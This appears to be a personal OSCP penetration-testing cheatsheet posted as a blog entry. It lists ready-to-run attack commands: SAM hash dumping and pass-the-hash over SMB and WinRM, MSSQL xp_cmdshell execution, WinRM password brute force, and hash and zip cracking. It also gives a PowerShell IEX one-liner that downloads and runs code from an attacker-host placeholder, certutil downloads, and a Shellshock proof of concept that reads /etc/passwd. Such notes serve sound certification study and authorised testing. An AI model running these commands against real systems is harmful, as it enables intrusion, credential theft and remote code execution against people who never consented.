---
layout: post
title: OSCP personal cheatsheet
tags: [OSCP, Cheatsheet]
description: "OSCP personal cheatsheet"
---

- [FTP - 21](#ftp---21)

- [Samba - 445](#samba---445)
    * [crackmapexec](#crackmapexec)
    * [smbclient](#smbclient)
- [MSSQL - 1433](#ms-sql---1433)
    * [mssqlclien.py](#mssqlclient.py)

- [Malicious macro analysis](#malicious-macro-analysis)
    * [Olevba](#olevba)

- [File transfer](#file-transfer)
    * [Linux](#linux)
    * [Windows](#powershell)

- [Cracking](#cracking)
    * [JohnTheRipper](#johntheripper)
    * [HashCat](#hashcat)

- [WINRM - 5985 - 5986](#winrm---5985---5986)
    * [Brute force](#brute-force)
    * [Connecting](#connecting)

- [Shellshock CGI](#shellshock-cgi)

- [Zip](#zip)

- [WordPress](#wordpress)

-----

# Samba - 445

## crackmapexec

Scanning

```
crackmapexec smb <ip>
```

Validate a user

```
crackmapexec smb <ip> -u <user> -p <password> -d <domain>
crackmapexec smb <ip> -u <user> -p <password> -d WORKGROUP
```

In case we have credentials of an admin user we can list ntlm hashes

```
crackmapexec smb <ip> -u "administrator" -p <password> --sam
```

## smbclient

Null sesion

```
smbclient -L <ip> -N
```

Authentication null session

```
smbclient //<ip>/<share> -N
```

Connection smb impacket

```
psexec.py WORKFROUP/<user>@<ip> cmd.exe
pth-winexe -U WORKGROUP/Administrator%<hash_ntlm> //<ip> cmd.exe
smbexec.py WORKGROUP/administrator@<ip> -hashes :<hash_ntlm>

```

# MSSQL - 1433

## mssqlclient.py

Take as a local user

```
mssqlclient.py WORKGROUP/user:user@<ip> windows-auth
```

User sa default mssql

```
mssqlclient.py WORKGROUP/<user>:<password>@<ip>
mssqlclient.py WORKGROUP/sa:sa@<ip>
mssqlclient.py WORKGROUP/sa@<ip>
```

Interacting with the shell

```
# Run commands
> xp_cmdshell "whoami"
# List shared resources at the network level
> xp_dirtree "\\<ip_attack>\shared\"
```

-----

# Malicious macro analysis
## Olevba

```
olevba <FILE>
```

-----

# File transfer

## Linux

#### Python
```
python -m SimpleHTTPServer <port>
python3 -m http.serer <port>
```

#### FTP

```
sudo python3 -m pyftpdlib  -p 21 -w
```

#### SMB

```
sudo smbserver.py -smb2support shared .
sudo impacket-smbserver -smb2support shared .
```

#### netcat

```
nc -lvp 1234 > <OUT_FILE>
nc <ip> 1234 < <IN_FILE>
```

#### wget

```
wget <URL> -o <OUT_FILE>
```

#### curl

```
curl <URL> -o <OUT_FILE>
```


## Windows

#### Powershell

```
IEX(New-Object Net.WebClient).downloadString("http://<IP_ATTACK>/<SHARED>")
```

#### Certutil

```
certutil.exe -f -split -urlcache "http://<IP_ATTACK>/<SHARED>"
```

#### curl

```
curl <URL> -o <OUT_FILE>
```

#### Python

```
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
```

# FTP

```
echo open <IP> 21 > ftp.txt
echo anonymous>> ftp.txt
echo password>> ftp.txt
echo binary>> ftp.txt
echo GET <FILE> >> ftp.txt
echo bye>> ftp.txt

ftp -v -n -s:ftp.txt
```

# SMB

```
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
```

-----

# Cracking

## JohnTheRipper

Cracking hash

```
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```

## HashCat


-----

# WINRM - 5985 - 5986

### Brute force

```
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
```

### Connecting

```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
```

------

# Shellshock CGI

POC: ```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>```

### Found CGI scripts

```
ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
```

------

## ZIP

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <FILE.zip>

zip2john FILE.zip > zip.john
john --wordlist=<PASSWORDS_LIST> zip.john
```

## WordPress
